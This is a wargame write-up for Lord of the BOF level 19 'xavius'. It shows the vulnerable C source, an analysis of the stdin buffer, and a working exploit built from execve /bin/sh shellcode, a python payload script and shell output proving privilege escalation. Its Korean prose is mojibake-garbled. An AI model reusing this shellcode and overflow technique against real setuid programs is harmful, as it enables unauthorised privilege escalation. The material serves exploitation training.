---
title: "[LOB]Level19. xavius"
tags: [LOB, writeup]
author: eli_ez3r
key: 20180019
category: write-up
date: 2018-08-31 04:00:00 +0900
modify_date: 2019-11-14
article_header:
  type: cover
  image:
    src: /assets/img/hackerschool_logo.png
---

[fgets + destroyers](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - xavius
        - arg
*/
#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

main()
{
    char buffer[40];
    char *ret_addr;

    // overflow!
    fgets(buffer, 256, stdin);
    printf("%s\n", buffer);

    if(*(buffer+47) == '\xbf')
    {
        printf("stack retbayed you!\n");
        exit(0);
    }

    if(*(buffer+47) == '\x08')
    {
        printf("binary image retbayed you, too!!\n");
        exit(0);
    }

    // check if the ret_addr is library function or not
    memcpy(&ret_addr, buffer+44, 4);
    while(memcmp(ret_addr, "\x90\x90", 2) != 0) // end point of function
    {
        if(*ret_addr == '\xc9'){        // leave
            if(*(ret_addr+1) == '\xc3'){    // ret
                printf("You cannot use library function!\n");
                exit(0);
            }
        }
        ret_addr++;
    }

    // stack destroyer
    memset(buffer, 0, 44);
    memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));

    // LD_* eraser
    // 40 : extra space for memset function
    memset(buffer-3000, 0, 3000-40);
}
```

-----

### 0x01. Analysis

- RET ë¶€ë¶„ì— '/xbf' ì˜ì—­ '/0x08' ì˜ì—­ì´ í•„í„°ë§ëœë‹¤.
- RET ë¶€ë¶„ì— leave-ret ë„ ì‚¬ìš©í•˜ì§€ ëª»í•œë‹¤.
- ë²„í¼ì˜ì—­ì´ ì´ˆê¸°í™”
- RET ì´í›„ ëª¨ë“  ì˜ì—­ ì´ˆê¸°í™”(arg, í™˜ê²½ë³€ìˆ˜, íŒŒì¼ì´ë¦„ì˜ì—­ ë“±...)



ì²˜ìŒ ë¬¸ì œë¥¼ ì ‘í•˜ê³  ë©˜ë¶•ì— ë¹ ì¡Œë‹¤. ì–´ë– í•œ ë°©ë²•ìœ¼ë¡œ ì ‘ê·¼í•´ì•¼ ë ì§€ ëª°ë¼ ë³„ì—ë³„ ì‹œë„ëŠ” ë‹¤í•´ë³¸ê²ƒ ê°™ë‹¤.

ê²°êµ­ Write-upì„ ë³´ê³  ì•Œê²Œ ë˜ì—ˆë‹¤.



ë‹¤ë¥¸ ë¬¸ì œë“¤ì„ ì‚´í´ë³´ë©´ fgetë‚˜ strcpy í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ argv[1]ì— ê°’ì„ ê°€ì ¸ì˜¤ëŠ”ë°, ì´ë²ˆ ë¬¸ì œëŠ” ìŒ©ëš±ë§ê²Œ stdin ìœ¼ë¡œ ê°€ì ¸ì˜¨ë‹¤. (ì´ ë¶€ë¶„ì„ ìºì¹˜í•˜ì§€ ëª»í•¨ ğŸ˜­)



stdinì— ëŒ€í•´ ì‚´í´ë³´ì.

<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802124706226.png" width="400px">



fgetsì—ì„œ ê°’ì„ ê°€ì ¸ì˜¤ëŠ” ë¶€ë¶„ì„ ë³´ë©´ stdinì˜ ì£¼ì†Œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.



<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802125145631.png" width="400px">



í•´ë‹¹ ì£¼ì†Œë¥¼ ë”°ë¼ê°€ë©´ \x40ì£¼ì†Œ ì˜ì—­ì— ì£¼ì†Œê°€ ë“¤ì–´ìˆë‹¤.(stdin@@GLIBC_2.0) ì´ë¼ê³  ë˜ì–´ìˆë‹¤.

![image-20180802125342227](http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802125342227.png)



í•´ë‹¹ ì£¼ì†Œì‚´í´ë³´ë©´ ìœ„ì™€ ê°™ì´ ë³´ì—¬ì§€ê³  ìˆìœ¼ë©°, ì‹¤ì œ 0x401068c0 ì€ stdinì˜ ì£¼ì†Œì™€ ê°™ë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤.

ì´ì œ ê°’ì„ ì…ë ¥í•´ë³´ê³  stdin ì˜ì—­ì— ì–´ë–»ê²Œ ë³€í™” ë˜ëŠ”ì§€ ì‚´í´ë³´ì.



![image-20180802130439045](http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802130439045.png)

printf í•¨ìˆ˜ì— ë¸Œë ˆì´í¬ë¥¼ ê±¸ê³  ê°’ì„ ì…ë ¥í•œ ë’¤ì— ë‹¤ì‹œ ì‚´í´ë³´ë©´ std+4, std+8, std+12 ë“±ì´ ë³€í–ˆë‹¤.

stdin êµ¬ì¡°ì²´ì— ë”°ë¼ ë³´ë©´, std+4ëŠ” ì–´ë””ê¹Œì§€ ì½ì—ˆëŠ”ì§€, stdin+8ì€ ì–¼ë§ˆë‚˜ ì…ë ¥ ë°›ì•˜ëŠ”ì§€, stdin+12ëŠ” stdinì˜ ì‹œì‘ ì£¼ì†Œë¥¼ ì˜ë¯¸í•œë‹¤.

ê·¸ëŸ¬ë©´ stdin+12ì˜ ì£¼ì†Œë¥¼ ì‚´í´ë³´ì.

<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802130810548.png" width="300px">

ì…ë ¥í•œ ê°’ì´ ë“¤ì–´ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.



<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/19.xavius/image-20180802131232591.png" width="700px">

ì‹¤ì œ ë©”ëª¨ë¦¬ ë§µì„ ì‚´í´ë³´ë©´, í•´ë‹¹ ì˜ì—­ì€ ì‹¤í–‰ ê¶Œí•œì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤. í•˜ì§€ë§Œ mapsì— ëŒ€í•œ ì •ë³´ëŠ” 100% ì •í™•í•˜ì§€ ì•Šë‹¤ëŠ” ì–˜ê¸°ë¥¼ ë“¤ì–´ì„œ ì‹œë„í•´ ë³´ì•˜ë‹¤.

-----

### 0x02. Exploit

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```
[nightmare@localhost nightmare]$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*20+"\x00\x50\x01\x40"';cat)|./xavius
1í”h//shh/binë¥PSë£ì†»
                     ?ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±
id
uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
my-pass
euid = 519
throw me away
```



ê³µê²©ì— ì„±ê³µ í•˜ëŠ”ê²ƒìœ¼ë¡œ ë³´ì•„ **mapsì— ëŒ€í•œ ì •ë³´ëŠ” ì •í™•í•˜ì§€ ì•Šë‹¤ëŠ” ê²ƒì´ ì¦ëª…ë˜ì—ˆë‹¤.**

-----

##### python

```python
import os
import struct

append = lambda x: payload + x
p32 = lambda x: struct.pack("<I", x)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
stdin_buf_addr = 0x40015000

payload = shellcode
payload = append("\x90"*(44-len(shellcode)))
payload = append(p32(stdin_buf_addr))

print payload
```

```
[nightmare@localhost nightmare]$ (python ex.py ; cat)|./xavius
1í”h//shh/binë¥PSë£ì†»
                     ?ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±
id
uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
my-pass
euid = 519
throw me away
```

-----

